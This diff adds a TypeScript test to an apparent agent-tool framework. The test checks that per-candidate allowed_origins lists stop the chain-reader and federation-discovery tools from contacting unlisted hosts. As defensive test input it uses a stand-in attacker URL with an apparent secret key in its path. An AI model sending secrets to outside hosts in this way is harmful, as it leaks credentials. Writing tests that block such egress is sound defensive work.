@@ -464,3 +464,62 @@ describe("tool_config.fetch reaches DependencyAudit without Fetch", () => {
     }
   });
 });
+
+/**
+ * C029 — a model_pool candidate's own `tool_config` block reaches the chain
+ * readers and FederationDiscover. compile --strict accepts it (the tools have
+ * a boot registrar), the runtime picks it with `toolConfigBlockFor` and hands
+ * it to the call as `ctx.toolConfig`; before 0.7.1 these two packages never
+ * read it, so a list set only on a candidate was silently ignored.
+ */
+describe("a model_pool candidate's tool_config narrows the chain readers and FederationDiscover", () => {
+  test("the block the runtime selects, by family key or tool key, is the one the call obeys", async () => {
+    const chainread = await import("@crewhaus/tool-chainread");
+    const discovery = await import("@crewhaus/tool-discovery");
+    const { toolConfigBlockFor } = await import("@crewhaus/tool-categories");
+    const dialled: string[] = [];
+    const dns = async () => ({ address: "93.184.216.34", family: 4 });
+    chainread._setDnsLookup(dns);
+    chainread._setFetch(async (req) => {
+      dialled.push(req.url);
+      return Response.json({ jsonrpc: "2.0", id: 1, result: "0x1" });
+    });
+    discovery._setDnsLookup(dns);
+    discovery._setFetch(async (req) => {
+      dialled.push(req.url);
+      return new Response("{}", { status: 404 });
+    });
+    try {
+      // The candidate's tool_config, as a spec writes it.
+      const candidate = {
+        chainread: { allowed_origins: ["https://mainnet.base.org"] },
+        federationDiscover: { allowed_origins: ["https://peer.example"] },
+      };
+      const rpcBlock = toolConfigBlockFor(candidate, "EvmRpcHealth");
+      const peerBlock = toolConfigBlockFor(candidate, "FederationDiscover");
+      expect(rpcBlock).toEqual(candidate.chainread);
+      expect(peerBlock).toEqual(candidate.federationDiscover);
+
+      const health = JSON.parse(
+        (await chainread.evmRpcHealth.execute(
+          { rpcUrl: "https://x.attacker.example/sk-live-5ecret" } as never,
+          { toolConfig: rpcBlock } as never,
+        )) as string,
+      );
+      expect(health.endpoints[0].reachable).toBe(false);
+      const sweep = JSON.parse(
+        (await discovery.federationDiscover.execute(
+          { peers: ["x.attacker.example"], refresh: true } as never,
+          { toolConfig: peerBlock } as never,
+        )) as string,
+      );
+      expect(sweep.summary.refused).toBe(1);
+      expect(dialled).toEqual([]);
+    } finally {
+      chainread._setFetch(undefined);
+      chainread._setDnsLookup(undefined);
+      discovery._setFetch(undefined);
+      discovery._setDnsLookup(undefined);
+    }
+  });
+});
